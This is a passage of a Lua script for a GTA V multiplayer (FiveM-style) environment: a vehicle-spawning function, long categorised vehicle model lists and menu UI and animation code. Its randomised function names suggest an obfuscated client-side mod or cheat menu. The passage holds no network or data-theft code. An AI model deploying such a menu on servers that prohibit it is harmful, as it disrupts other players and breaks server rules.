		table.insert(valid, 1, {
			menuName="Stock",
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		})
	end

	return valid
end
---------------------
--  Vehicle Class  --
---------------------
local function gQOkxHiEJs(modelName, replaceCurrent, spawnInside)
	local speed = 0
	local rpm = 0

	if fjustimen.Player.IsInVehicle then
		local oldVehicle = fjustimen.Player.Vehicle
		speed = GetEntitySpeedVector(oldVehicle, true).y
		rpm = GetVehicleCurrentRpm(oldVehicle)
	end

	if IsModelValid(modelName) and IsModelAVehicle(modelName) then
		RequestModel(modelName)

		while not HasModelLoaded(modelName) do
			Wait(0)
		end

		local pos = (spawnInside and GetEntityCoords(PlayerPedId()) or GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 4.0, 0.0))
		local heading = GetEntityHeading(PlayerPedId()) + (spawnInside and 0 or 90)

		if replaceCurrent then
			uloTRbVjGn(fjustimen.Player.Vehicle)
		end

		local vehicle = CreateVehicle(GetHashKey(modelName), pos.x, pos.y, pos.z, heading, true, false)

		if spawnInside then
			SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
			SetVehicleEngineOn(vehicle, true, true)
		end
		
		SetVehicleForwardSpeed(vehicle, speed)
		SetVehicleCurrentRpm(vehicle, rpm)
		
		SetEntityAsNoLongerNeeded(vehicle)

		SetModelAsNoLongerNeeded(modelName)
	end


end


local VehicleClass = {
	
	-- VEHICLES LISTS
	compacts = {
		{"BLISTA"},
		{"BRIOSO", "sssa_dlc_stunt"},
		{"DILETTANTE", "sssa_default", "dilettan"},
		-- {"DILETTANTE2"},
		{"ISSI2", "sssa_default"},
		{"ISSI3", "sssa_dlc_assault"},
		{"ISSI4"},
		{"ISSI5"},
		{"ISSI6"},
		{"PANTO", "sssa_dlc_hipster"},
		{"PRAIRIE", "sssa_dlc_battle"},
		{"RHAPSODY", "sssa_dlc_hipster"}
	},
	
	sedans = {
		{"ASEA", "sssa_dlc_business"},
		{"ASEA2"},
		{"ASTEROPE", "sssa_dlc_business", "astrope"},
		{"COG55", "lgm_dlc_apartments"},
		{"COG552", "lgm_dlc_apartments", "cog55"},
		{"COGNOSCENTI", "lgm_dlc_apartments", "cognosc"},
		{"COGNOSCENTI2", "lgm_dlc_apartments", "cognosc"},
		{"EMPEROR"},
		{"EMPEROR2"},
		{"EMPEROR3"},
		{"FUGITIVE", "sssa_default"},
		{"GLENDALE", "sssa_dlc_hipster"},
		{"INGOT", "sssa_dlc_business"},
		{"INTRUDER", "sssa_dlc_business"},
		{"LIMO2"},
		{"PREMIER", "sssa_dlc_business"},
		{"PRIMO"},
		{"PRIMO2", "lsc_default"},
		{"REGINA"},
		{"ROMERO", "sssa_dlc_battle"},
		{"SCHAFTER2", "sssa_dlc_heist"},
		{"SCHAFTER5"},
		{"SCHAFTER6"},
		{"STAFFORD", "lgm_dlc_battle"},
		{"STANIER", "sssa_dlc_business"},
		{"STRATUM", "sssa_dlc_business"},
		{"STRETCH", "sssa_default"},
		{"SUPERD", "lgm_default"},
		{"SURGE", "sssa_dlc_heist"},
		{"TAILGATER"},
		{"WARRENER"},
		{"WASHINGTON", "sssa_dlc_business", "washingt"},
	},
	
	suvs = {
		{"BALLER"},
		{"BALLER2", "sssa_default"},
		{"BALLER3", "lgm_dlc_apartments"},
		{"BALLER4", "lgm_dlc_apartments"},
		{"BALLER5"},
		{"BALLER6"},
		{"BJXL", "sssa_dlc_battle"},
		{"CAVALCADE", "sssa_default", "cavcade"},
		{"CAVALCADE2", "sssa_dlc_business", "cavcade2"},
		{"CONTENDER", "sssa_dlc_mp_to_sp"},
		{"DUBSTA"},
		{"DUBSTA2"},
		{"FQ2", "sssa_dlc_battle"},
		{"GRANGER", "sssa_dlc_business"},
		{"GRESLEY", "sssa_dlc_heist"},
		{"HABANERO", "sssa_dlc_battle"},
		{"HUNTLEY", "lgm_dlc_business2"},
		{"LANDSTALKER", "sssa_dlc_heist"},
		{"MESA", "candc_default"},
		{"MESA2"},
		{"PATRIOT", "sssa_dlc_battle"},
		{"PATRIOT2", "sssa_dlc_battle"},
		{"RADI", "sssa_dlc_business"},
		{"ROCOTO", "sssa_default"},
		{"SEMINOLE", "sssa_dlc_heist"},
		{"SERRANO", "sssa_dlc_battle"},
		{"TOROS", "lgm_dlc_apartments"},
		{"XLS", "lgm_dlc_executive1"},
		{"XLS2"},
	},
	
	coupes = {
		{"COGCABRIO", "lgm_default", "cogcabri"},
		{"EXEMPLAR", "sssa_default"},
		{"F620", "sssa_dlc_business"},
		{"FELON", "sssa_default"},
		{"FELON2", "sssa_default"},
		{"JACKAL", "sssa_dlc_heist"},
		{"ORACLE", "sssa_default"},
		{"ORACLE2"},
		{"SENTINEL", "sssa_dlc_business"},
		{"SENTINEL2"},
		{"WINDSOR", "lgm_dlc_swage"},
		{"WINDSOR2", "lgm_dlc_executive1"},
		{"ZION", "sssa_default"},
		{"ZION2", "sssa_default"},
	},
	
	muscle = {
		{"BLADE", "sssa_dlc_heist"},
		{"BUCCANEER"},
		{"BUCCANEER2", "lsc_default"},
		{"CHINO", "lgm_dlc_swage"},
		{"CHINO2", "lsc_default"},
		{"CLIQUE", "lgm_dlc_arena"},
		{"COQUETTE3", "lgm_dlc_swage"},
		{"DEVIANT", "lgm_dlc_apartments"},
		{"DOMINATOR", "sssa_dlc_business", "dominato"},
		{"DOMINATOR2", "sssa_dlc_mp_to_sp"},
		{"DOMINATOR3", "sssa_dlc_assault"},
		{"DOMINATOR4"},
		{"DOMINATOR5"},
		{"DOMINATOR6"},
		{"DUKES", "candc_default"},
		{"DUKES2", "candc_default"},
		{"ELLIE", "sssa_dlc_assault"},
		{"FACTION"},
		{"FACTION2", "lsc_default"},
		{"FACTION3", "lsc_lowrider"},
		{"GAUNTLET", "sssa_default"},
		{"GAUNTLET2", "sssa_dlc_mp_to_sp"},
		{"HERMES", "sssa_dlc_xmas2017"},
		{"HOTKNIFE", "lgm_default"},
		{"HUSTLER", "lgm_dlc_xmas2017"},
		{"IMPALER", "sssa_dlc_vinewood"},
		{"IMPALER2"},
		{"IMPALER3"},
		{"IMPALER4"},
		{"IMPERATOR"},
		{"IMPERATOR2"},
		{"IMPERATOR3"},
		{"LURCHER", "sssa_dlc_halloween"},
		{"MOONBEAM"},
		{"MOONBEAM2", "lsc_default"},
		{"NIGHTSHADE", "lgm_dlc_apartments", "NITESHAD"},
		{"PHOENIX"},
		{"PICADOR"},
		{"RATLOADER"},
		{"RATLOADER2"},
		{"RUINER", "sssa_dlc_battle"},
		{"RUINER2", "candc_importexport"},
		{"RUINER3"},
		{"SABREGT"},
		{"SABREGT2", "lsc_lowrider2"},
		{"SLAMVAN", "sssa_dlc_christmas_2"},
		{"SLAMVAN2"},
		{"SLAMVAN3", "lsc_lowrider2"},
		{"SLAMVAN4"},
		{"SLAMVAN5"},
		{"SLAMVAN6"},
		{"STALION", "sssa_dlc_mp_to_sp"},
		{"STALION2", "sssa_dlc_mp_to_sp"},
		{"TAMPA", "sssa_dlc_christmas_3"},
		{"TAMPA3", "candc_gunrunning"},
		{"TULIP", "sssa_dlc_arena"},
		{"VAMOS", "sssa_dlc_arena"},
		{"VIGERO", "sssa_default"},
		{"VIRGO", "lgm_dlc_swage"},
		{"VIRGO2", "lsc_lowrider"},
		{"VIRGO3"},
		{"VOODOO", "lsc_default"},
		{"VOODOO2"},
		{"YOSEMITE", "sssa_dlc_xmas2017"},
	},
	
	sportsclassics = {
		{"ARDENT", "candc_gunrunning"},
		{"BTYPE"},
		{"BTYPE2", "sssa_dlc_halloween"},
		{"BTYPE3"},
		{"CASCO", "lgm_dlc_heist"},
		{"CHEBUREK", "sssa_dlc_assault"},
		{"CHEETAH2", "lgm_dlc_executive1"},
		{"COQUETTE2", "lgm_dlc_pilot"},
		{"DESWAGO", "candc_xmas2017"},
		{"FAGALOA", "sssa_dlc_assault"},
		{"FELTZER3", "lgm_dlc_swage"},
		{"GT500", "lgm_dlc_xmas2017"},
		{"INFERNUS2", "lgm_dlc_specialraces"},
		{"JB700", "lgm_default"},
		{"JESTER3", "lgm_dlc_apartments"},
		{"MAMBA", "lgm_dlc_apartments"},
		{"MANANA"},
		{"MICHELLI", "sssa_dlc_assault"},
		{"MONROE", "lgm_default"},
		{"PEYOTE"},
		{"PIGALLE"},
		{"RAPIDGT3", "lgm_dlc_smuggler"},
		{"RETINUE", "sssa_dlc_mp_to_sp"},
		{"SAVESTRA", "lgm_dlc_xmas2017"},
		{"STINGER", "lgm_default"},
		{"STINGERGT", "lgm_default", "stingerg"},
		{"STROMBERG", "candc_xmas2017"},
		{"SWINGER", "lgm_dlc_battle"},
		{"TORERO", "lgm_dlc_executive1"},
		{"TORNADO"},
		{"TORNADO2"},
		{"TORNADO3"},
		{"TORNADO4"},
		{"TORNADO5", "lsc_lowrider2"},
		{"TORNADO6", "sssa_dlc_biker"},
		{"TURISMO2", "lgm_dlc_specialraces"},
		{"VISERIS", "lgm_dlc_xmas2017"},
		{"Z190", "lgm_dlc_xmas2017"},
		{"ZTYPE", "lgm_default"},
	},
	
	sports = {
		{"ALPHA", "lgm_dlc_business"},
		{"BANSHEE", "lgm_default"},
		{"BESTIAGTS", "lgm_dlc_executive1"},
		{"BLISTA2", "sssa_dlc_mp_to_sp"},
		{"BLISTA3", "sssa_dlc_arena"},
		{"BUFFALO"},
		{"BUFFALO2"},
		{"BUFFALO3", "sssa_dlc_mp_to_sp"},
		{"CARBONIZZARE", "lgm_default", "carboniz"},
		{"COMET2", "sssa_default"},
		{"COMET3", "lsc_dlc_import_export"},
		{"COMET4", "lgm_dlc_xmas2017"},
		{"COMET5", "lgm_dlc_xmas2017"},
		{"COQUETTE", "lgm_default"},
		{"ELEGY", "lsc_dlc_import_export"},
		{"ELEGY2", "lgm_default"},
		{"FELTZER2", "lgm_default"},
		{"FLASHGT", "lgm_dlc_apartments"},
		{"FUROREGT", "lgm_dlc_its_creator", "furore"},
		{"FUSILADE", "sssa_dlc_business"},
		{"FUTO", "sssa_dlc_battle"},
		{"GB200", "lgm_dlc_apartments"},
		{"HOTRING", "sssa_dlc_assault"},
		{"ITALIGTO", "lgm_dlc_apartments"},
		{"JESTER", "lgm_dlc_business"},
		{"JESTER2", "sssa_dlc_christmas_2"},
		{"KHAMELION", "lgm_default"},
		{"KURUMA", "sssa_dlc_heist"},
		{"KURUMA2", "sssa_dlc_heist"},
		{"LYNX", "lgm_dlc_stunt"},
		{"MASSACRO", "lgm_dlc_business2"},
		{"MASSACRO2", "sssa_dlc_christmas_2"},
		{"NEON", "lgm_dlc_xmas2017"},
		{"NINEF", "lgm_default"},
		{"NINEF2", "lgm_default"},
		{"OMNIS", "sssa_dlc_mp_to_sp"},
		{"PARIAH", "lgm_dlc_xmas2017"},
		{"PENUMBRA", "sssa_dlc_business"},
		{"RAIDEN", "lgm_dlc_xmas2017"},
		{"RAPIDGT", "lgm_default"},
		{"RAPIDGT2", "lgm_default"},
		{"RAPTOR", "lgm_dlc_biker"},
		{"REVOLTER", "lgm_dlc_xmas2017"},
		{"RUSTON", "lgm_dlc_specialraces"},
		{"SCHAFTER2"},
		{"SCHAFTER3", "lgm_dlc_apartments"},
		{"SCHAFTER4", "lgm_dlc_apartments"},
		{"SCHAFTER5"},
		{"SCHLAGEN", "lgm_dlc_apartments"},
		{"SCHWARZER", "sssa_default", "schwarze"},
		{"SENTINEL3", "sssa_dlc_xmas2017"},
		{"SEVEN70", "lgm_dlc_executive1"},
		{"SPECTER"},
		{"SPECTER2", "lsc_dlc_import_export"},
		{"SULTAN"},
		{"SURANO", "lgm_default"},
		{"TAMPA2"},
		{"TROPOS"},
		{"VERLIERER2", "lgm_dlc_apartments", "verlier"},
		{"ZR380"},
		{"ZR3802"},
		{"ZR3803"},
	},
	
	super = {
		{"ADDER", "lgm_default"},
		{"AUTARCH", "lgm_dlc_xmas2017"},
		{"BANSHEE2", "lgm_default"},
		{"BULLET", "lgm_default"},
		{"CHEETAH", "lgm_default"},
		{"CYCLONE", "lgm_dlc_smuggler"},
		{"DEVESTE", "lgm_dlc_apartments"},
		{"ENTITYXF", "lgm_default"},
		{"ENTITY2", "lgm_dlc_apartments"},
		{"FMJ", "lgm_dlc_executive1"},
		{"GP1", "lgm_dlc_specialraces"},
		{"INFERNUS", "lgm_default"},
		{"ITALIGTB"},
		{"ITALIGTB2", "lsc_dlc_import_export"},
		{"LE7B", "lgm_dlc_stunt"},
		{"NERO"},
		{"NERO2", "lsc_dlc_import_export"},
		{"OSIRIS", "lgm_dlc_swage"},
		{"PENETRATOR", "lgm_dlc_heist"},
		{"PFISTER811", "lgm_dlc_executive1"},
		{"PROTOTIPO", "lgm_dlc_executive1"},
		{"REAPER", "lgm_dlc_executive1"},
		{"SC1", "lgm_dlc_xmas2017"},
		{"SCRAMJET", "candc_battle"},
		{"SHEAVA", "lgm_dlc_stunt"},
		{"SULTANRS", "lsc_jan2016", "sultan2"},
		{"T20", "lgm_dlc_swage"},
		{"TAIPAN", "lgm_dlc_apartments"},
		{"TEMPESTA", "lgm_dlc_heist"},
		{"TEZERACT", "lgm_dlc_apartments"},
		{"TURISMOR", "lgm_dlc_business"},
		{"TYRANT", "lgm_dlc_apartments"},
		{"TYRUS", "lgm_dlc_stunt"},
		{"VACCA", "lgm_default"},
		{"VAGNER", "lgm_dlc_executive1"},
		{"VIGILANTE", "candc_smuggler"},
		{"VISIONE", "lgm_dlc_smuggler"},
		{"VOLTIC", "lgm_default", "voltic_tless"},
		{"VOLTIC2", "candc_importexport"},
		{"XA21", "lgm_dlc_executive1"},
		{"ZENTORNO", "lgm_dlc_business2"},
	},
	
	motorcycles = {
		{"AKUMA", "sssa_default"},
		{"AVARUS", "sssa_dlc_biker"},
		{"BAGGER", "sssa_dlc_biker"},
		{"BATI", "sssa_default"},
		{"BATI2", "sssa_default"},
		{"BF400", "sssa_dlc_mp_to_sp"},
		{"CARBONRS", "lgm_default", "carbon"},
		{"CHIMERA", "sssa_dlc_biker"},
		{"CLIFFHANGER", "sssa_dlc_mp_to_sp"},
		{"DAEMON"},
		{"DAEMON2", "sssa_dlc_biker"},
		{"DEFILER", "sssa_dlc_biker"},
		{"DEATHBIKE"},
		{"DEATHBIKE2"},
		{"DEATHBIKE3"},
		{"DIABLOUS"},
		{"DIABLOUS2", "lsc_dlc_import_export"},
		{"DOUBLE", "sssa_default"},
		{"ENDURO", "sssa_dlc_heist"},
		{"ESSKEY", "sssa_dlc_biker"},
		{"FAGGIO", "sssa_default"},
		{"FAGGIO2"},
		{"FAGGIO3", "sssa_dlc_biker"},
		{"FCR"},
		{"FCR2", "lsc_dlc_import_export"},
		{"GARGOYLE", "mba_vehicles"},
		{"HAKUCHOU", "sssa_dlc_its_creator"},
		{"HAKUCHOU2", "lgm_dlc_biker"},
		{"HEXER", "sssa_default"},
		{"INNOVATION", "sssa_dlc_heist"},
		{"LECTRO", "lgm_dlc_heist"},
		{"MANCHEZ", "sssa_dlc_biker"},
		{"NEMESIS", "sssa_dlc_heist"},
		{"NIGHTBLADE", "sssa_dlc_biker"},
		{"OPPRESSOR", "candc_gunrunning"},
		{"OPPRESSOR2", "candc_battle"},
		{"PCJ", "sssa_default"},
		{"RATBIKE", "sssa_dlc_biker"},
		{"RUFFIAN", "sssa_default"},
		{"SANCHEZ", "sssa_default"},
		{"SANCHEZ2", "sssa_default"},
		{"SANCTUS", "sssa_dlc_biker"},
		{"SHOTARO", "lgm_dlc_biker"},
		{"SOVEREIGN", "sssa_dlc_heist"},
		{"THRUST", "lgm_dlc_business2"},
		{"VADER", "sssa_default"},
		{"VINDICATOR", "lgm_dlc_swage"},
		{"VORTEX", "sssa_dlc_biker"},
		{"WOLFSBANE", "sssa_dlc_biker"},
		{"ZOMBIEA", "sssa_dlc_biker"},
		{"ZOMBIEB", "sssa_dlc_biker"},
	},
	
	offroad = {
		{"BFINJECTION", "sssa_default", "bfinject"},
		{"BIFTA", "sssa_default"},
		{"BLAZER", "sssa_default"},
		{"BLAZER2", "candc_casinoheist"},
		{"BLAZER3"},
		{"BLAZER4", "sssa_dlc_biker"},
		{"BLAZER5", "candc_importexport"},
		{"BODHI2", "sssa_default"},
		{"BRAWLER", "lgm_dlc_swage"},
		{"BRUISER"},
		{"BRUISER2"},
		{"BRUISER3"},
		{"BRUTUS"},
		{"BRUTUS2"},
		{"BRUTUS3"},
		{"CARACARA", "sssa_dlc_vinewood"},
		{"DLOADER"},
		{"DUBSTA3", "candc_default"},
		{"DUNE", "sssa_default"},
		{"DUNE2"},
		{"DUNE3", "candc_gunrunning"},
		{"DUNE4"},
		{"DUNE5", "candc_importexport"},
		{"FREECRAWLER", "lgm_dlc_battle"},
		{"INSURGENT", "candc_default"},
		{"INSURGENT2", "candc_default"},
		{"INSURGENT3"},
		{"KALAHARI", "sssa_default"},
		{"KAMACHO", "sssa_dlc_xmas2017"},
		{"MARSHALL", "candc_default"},
		{"MENACER", "candc_battle"},
		{"MESA3", "candc_default"},
		{"MONSTER", "candc_default"},
		{"MONSTER3"},
		{"MONSTER4"},
		{"MONSTER5"},
		{"NIGHTSHARK", "candc_gunrunning"},
		{"RANCHERXL", "sssa_dlc_business", "rancherx"},
		{"RANCHERXL2"},
		{"RCBANDITO", "sssa_dlc_arena"},
		{"REBEL", "sssa_default"},
		{"REBEL2"},
		{"RIATA", "sssa_dlc_xmas2017"},
		{"SANDKING", "sssa_default"},
		{"SANDKING2", "sssa_default", "sandkin2"},
		{"TECHNICAL", "candc_default"},
		{"TECHNICAL2", "candc_importexport"},
		{"TECHNICAL3"},
		{"TROPHYTRUCK"},
		{"TROPHYTRUCK2"},
	},
	
	industrial = {
		{"BULLDOZER"},
		{"CUTTER"},
		{"DUMP", "candc_default"},
		{"FLATBED"},
		{"GUARDIAN", "sssa_dlc_heist"},
		{"HANDLER"},
		{"MIXER"},
		{"MIXER2"},
		{"RUBBLE"},
		{"TIPTRUCK"},
		{"TIPTRUCK2"},
	},
	
	utility = {
		{"AIRTUG"},
		{"CADDY"},
		{"CADDY2"},
		{"CADDY3"},
		{"DOCKTUG"},
		{"FORKLIFT"},
		{"TRACTOR2"},
		{"TRACTOR3"},
		{"MOWER"},
		{"RIPLEY"},
		{"SADLER", "sssa_default"},
		{"SADLER2"},
		{"SCRAP"},
		{"TOWTRUCK"},
		{"TOWTRUCK2"},
		{"TRACTOR"},
		{"UTILLITRUCK"},
		{"UTILLITRUCK2"},
		{"UTILLITRUCK3"},
		{"ARMYTRAILER"},
		{"ARMYTRAILER2"},
		{"FREIGHTTRAILER"},
		{"ARMYTANKER"},
		{"TRAILERLARGE"},
		{"DOCKTRAILER"},
		{"TR3"},
		{"TR2"},
		{"TR4"},
		{"TRFLAT"},
		{"TRAILERS"},
		{"TRAILERS4"},
		{"TRAILERS2"},
		{"TRAILERS3"},
		{"TVTRAILER"},
		{"TRAILERLOGS"},
		{"TANKER"},
		{"TANKER2"},
		{"BALETRAILER"},
		{"GRAINTRAILER"},
		{"BOATTRAILER"},
		{"RAKETRAILER"},
		{"TRAILERSMALL"},
	},
	
	vans = {
		{"BISON", "sssa_default"},
		{"BISON2"},
		{"BISON3"},
		{"BOBCATXL", "sssa_dlc_business"},
		{"BOXVILLE", "candc_casinoheist"},
		{"BOXVILLE2"},
		{"BOXVILLE3"},
		{"BOXVILLE4", "candc_default"},
		{"BOXVILLE5", "candc_importexport"},
		{"BURRITO"},
		{"BURRITO2", "candc_casinoheist"},
		{"BURRITO3"},
		{"BURRITO4"},
		{"BURRITO5"},
		{"CAMPER"},
		{"GBURRITO"},
		{"GBURRITO2", "sssa_dlc_heist"},
		{"JOURNEY", "candc_default"},
		{"MINIVAN", "sssa_dlc_business"},
		{"MINIVAN2", "lsc_lowrider2"},
		{"PARADISE", "sssa_default"},
		{"PONY"},
		{"PONY2"},
		{"RUMPO", "sssa_dlc_heist"},
		{"RUMPO2"},
		{"RUMPO3", "sssa_dlc_executive_1"},
		{"SPEEDO"},
		{"SPEEDO2"},
		{"SPEEDO4"},
		{"SURFER"},
		{"SURFER2"},
		{"TACO"},
		{"YOUGA"},
		{"YOUGA2", "sssa_dlc_biker"},
	},
	
	cycles = {
		{"BMX", "pandm_default"},
		{"CRUISER", "pandm_default"},
		{"FIXTER"},
		{"SCORCHER", "pandm_default"},
		{"TRIBIKE", "pandm_default"},
		{"TRIBIKE2", "pandm_default"},
		{"TRIBIKE3", "pandm_default"},
	},
	
	boats = {
		{"DINGHY", "dock_default", "DINGHY3"},
		{"DINGHY2", "dock_default", "DINGHY3"},
		{"DINGHY3", "dock_default"},
		{"DINGHY4", "dock_default", "DINGHY3"},
		{"JETMAX", "dock_default"},
		{"MARQUIS", "dock_default"},
		{"PREDATOR"},
		{"SEASHARK", "dock_default"},
		{"SEASHARK2"},
		{"SEASHARK3"},
		{"SPEEDER", "dock_default"},
		{"SPEEDER2"},
		{"SQUALO", "dock_default"},
		{"SUBMERSIBLE"},
		{"SUBMERSIBLE2"},
		{"SUNTRAP", "dock_default"},
		{"TORO", "dock_default"},
		{"TORO2", "dock_default", "TORO"},
		{"TROPIC", "dock_default"},
		{"TROPIC2"},
		{"TUG", "dock_dlc_executive1"},
	},
	
	helicopters = {
		{"AKULA", "candc_xmas2017"},
		{"ANNIHILATOR"},
		{"BUZZARD", "candc_default"},
		{"BUZZARD2"},
		{"CARGOBOB", "candc_default"},
		{"CARGOBOB2", "candc_executive1"},
		{"CARGOBOB3"},
		{"CARGOBOB4"},
		{"FROGGER"},
		{"FROGGER2"},
		{"HAVOK", "elt_dlc_smuggler"},
		{"HUNTER", "candc_smuggler"},
		{"MAVERICK"},
		{"POLMAV"},
		{"SAVAGE", "candc_default"},
		{"SEASPARROW", "elt_dlc_assault", "sparrow"},
		{"SKYLIFT"},
		{"SUPERVOLITO"},
		{"SUPERVOLITO2"},
		{"SWIFT", "elt_dlc_pilot"},
		{"SWIFT2", "elt_dlc_swage"},
		{"VALKYRIE", "candc_default"},
		{"VALKYRIE2"},
		{"VOLATUS", "elt_dlc_executive1"},
	},
	
	planes = {
		{"ALPHAZ1", "elt_dlc_smuggler"},
		{"AVENGER"},
		{"AVENGER2"},
		{"BESRA", "elt_dlc_pilot"},
		{"BLIMP"},
		{"BLIMP2"},
		{"BLIMP3", "elt_dlc_battle"},
		{"BOMBUSHKA", "candc_smuggler"},
		{"CARGOPLANE"},
		{"CUBAN800"},
		{"DODO"},
		{"DUSTER"},
		{"HOWARD", "elt_dlc_smuggler"},
		{"HYDRA", "candc_default"},
		{"JET"},
		{"LAZER", "candc_smuggler"},
		{"SWAGOR"},
		{"SWAGOR2", "elt_dlc_swage"},
		{"MAMMATUS"},
		{"MICROLIGHT", "elt_dlc_smuggler"},
		{"MILJET", "elt_dlc_pilot"},
		{"MOGUL", "candc_smuggler"},
		{"MOLOTOK", "candc_smuggler"},
		{"NIMBUS", "elt_dlc_executive1"},
		{"NOKOTA", "candc_smuggler"},
		{"PYRO", "candc_smuggler"},
		{"ROGUE", "candc_smuggler"},
		{"SEABREEZE", "elt_dlc_smuggler"},
		{"SHAMAL"},
		{"STARLING", "candc_smuggler"},
		{"STRIKEFORCE", "candc_battle"},
		{"STUNT"},
		{"TITAN"},
		{"TULA", "candc_smuggler"},
		{"VELUM"},
		{"VELUM2"},
		{"VESTRA", "elt_dlc_business"},
		{"VOLATOL", "candc_xmas2017"},
	},
		
	service = {
		{"AIRBUS", "candc_default"},
		{"BRICKADE", "candc_executive1"},
		{"BUS", "candc_default"},
		{"COACH", "candc_default"},
		{"PBUS2", "sssa_dlc_battle"},
		{"RALLYTRUCK", "sssa_dlc_mp_to_sp"},
		{"RENTALBUS"},
		{"TAXI"},
		{"TOURBUS"},
		{"TRASH"},
		{"TRASH2"},
		{"WASTELANDER", "candc_importexport", "wastlndr"},
		{"AMBULANCE"},
		{"FBI"},
		{"FBI2"},
		{"FIRETRUK", "candc_casinoheist"},
		{"LGUARD", "candc_casinoheist"},
		{"PBUS", "candc_default"},
		{"POLICE"},
		{"POLICE2"},
		{"POLICE3"},
		{"POLICE4"},
		{"POLICEB"},
		{"POLICEOLD1"},
		{"POLICEOLD2"},
		{"POLICET"},
		{"POLMAV"},
		{"PRANGER"},
		{"PREDATOR"},
		{"RIOT"},
		{"RIOT2", "candc_xmas2017"},
		{"SHERIFF"},
		{"SHERIFF2"},
		{"APC", "candc_gunrunning"},
		{"BARRACKS", "candc_default"},
		{"BARRACKS2"},
		{"BARRACKS3"},
		{"BARRAGE", "candc_xmas2017"},
		{"CHERNOBOG", "candc_xmas2017"},
		{"CRUSADER", "candc_default"},
		{"HALFTRACK", "candc_gunrunning"},
		{"KHANJALI", "candc_xmas2017"},
		{"RHINO", "candc_default"},
		{"SCARAB"},
		{"SCARAB2"},
		{"SCARAB3"},
		{"THRUSTER", "candc_xmas2017"},
		{"TRAILERSMALL2"},
	},
		
	commercial = {
		{"BENSON"},
		{"BIFF"},
		{"CERBERUS"},
		{"CERBERUS2"},
		{"CERBERUS3"},
		{"HAULER"},
		{"HAULER2"},
		{"MULE", "candc_default"},
		{"MULE2"},
		{"MULE3", "candc_default"},
		{"MULE4", "candc_battle"},
		{"PACKER"},
		{"PHANTOM"},
		{"PHANTOM2", "candc_importexport"},
		{"PHANTOM3"},
		{"POUNDER"},
		{"POUNDER2", "candc_battle"},
		{"STOCKADE", "candc_casinoheist"},
		{"STOCKADE3"},
		{"TERBYTE"},
		{"CABLECAR"},
		{"FREIGHT"},
		{"FREIGHTCAR"},
		{"FREIGHTCONT1"},
		{"FREIGHTCONT2"},
		{"FREIGHTGRAIN"},
		{"METROTRAIN"},
		{"TANKERCAR"},
	},

}


---------------------
--  fjustimenUI Class  --
---------------------

fjustimenUI = {}

fjustimenUI.debug = false

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local aspectRatio = GetAspectRatio(true)
local screenResolution = GetActiveScreenResolution()

local menuWidth = 0.19 -- old version was 0.23
local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local separatorHeight = 0.0025

local buttonHeight = 0.038
local buttonFont = 4
local buttonScale = 0.375
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.0065
local buttonSpriteXOffset = 0.011
local buttonSpriteScale = { x = 0.016, y = 0 }

local fontHeight = GetTextScaleHeight(buttonScale, buttonFont)

local sliderWidth = (menuWidth / 4)

local sliderHeight = 0.016

local knobWidth = 0.002
local knobHeight = 0.016

local sliderFontScale = 0.275
local sliderFontHeight = GetTextScaleHeight(sliderFontScale, buttonFont)


local toggleInnerWidth = 0.008
local toggleInnerHeight = 0.014
local toggleOuterWidth = 0.01125
local toggleOuterHeight = 0.020

-- Vehicle preview, PlayerInfo, etc
local previewWidth = 0.100

local frameWidth = 0.004

local footerHeight = 0.023

local t
local pow = function(num, pow) return num ^ pow end
local sin = math.sin
local cos = math.cos
local sqrt = math.sqrt
local abs = math.abs
local asin  = math.asin

------------------------------------------------------------------------
-- t = time == how much time has to pass for the tweening to complete --
-- b = begin == starting property value								  --
-- c = change == ending - beginning									  --
-- d = duration == running time. How much time has passed *right now* --
------------------------------------------------------------------------

local cout = function(text) return end

local function outCubic(t, b, c, d)
	t = t / d - 1
	return c * (pow(t, 3) + 1) + b
end

local function inCubic (t, b, c, d)
	t = t / d
	return c * pow(t, 3) + b
end

local function inOutCubic(t, b, c, d)
	t = t / d * 2
	if t < 1 then
		return c / 2 * t * t * t + b
	else
		t = t - 2
		return c / 2 * (t * t * t + 2) + b
	end
end
  
local function outInCubic(t, b, c, d)
	if t < d / 2 then
		return outCubic(t * 2, b, c / 2, d)
	else
		return inCubic((t * 2) - d, b + c / 2, c / 2, d)
	end
end

local notifyBody = {
	-- Text
	scale = 0.35,
	offsetLine = 0.0235, -- text height: 0.019 | newline height: 0.005 or 0.006
	finalPadding = 0.01,
	-- Warp
	offsetX = 0.095, -- 0.0525
	offsetY = 0.009875, -- 0.01
	-- Draw below footer
	footerYOffset = 0,
	-- Sprite
	dict = 'commonmenu',
	sprite = 'header_gradient_script',
	font = 4,
	width = menuWidth + frameWidth, 
	height = 0.023, -- magic 0.8305 -- 0.011625
	heading = 90.0,
	-- Betwenn != notifications
	gap = 0.006,
}

local notifyDefault = {
	text = "Someone forgot to change me!",
	type = 'info',
	timeout = 6000,
	transition = 750,
}

local function mKGNQLEGbF(v, text)
	BeginTextCommandLineCount("notification_buffer")
	SetTextFont(notifyBody.font)
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + notifyBody.width / 2)
	AddTextComponentSubstringPlayerName(text)
	local nbrLines = GetTextScreenLineCount(v.x - notifyBody.offsetX, v.y - notifyBody.height)
	return nbrLines
end

-- Thread content
local function errWPioclc(v, from, to, duration)
	local notif = v
	local beginVal = from
	local endVal = to
	local change = endVal - beginVal

	local timer = 0
	
	local function SetTimer()
		timer = GetGameTimer()
	end
	
	local function GetTimer()
		return GetGameTimer() - timer
	end

	local new_what
	SetTimer()
	local isMoving = true
	while isMoving do
		new_what = outCubic(GetTimer(), beginVal, change, duration)
		if notif.y < endVal then
			notif.y = new_what
		else
			notif.y = endVal
			isMoving = false
			break
		end
		Wait(5)
	end

	-- print("make room done")
end

-- Animating the 'push' transition of NotifyPrioritize
local function qEBqrQgyir(v, from, to, duration)
	IOeFDEouNG(function()
		return errWPioclc(v, from, to, duration)
	end)
end

-- Does nothing right now; not used
local function dUGzyoowpJ()
	SetScriptGfxAlign(string.byte('L'), string.byte('B'))
	local minimapTopX, minimapTopY = GetScriptGfxPosition(-0.0045, 0.002 + (-0.188888))
	ResetScriptGfxAlign()
	
	local w, h = GetActiveScreenResolution()
	
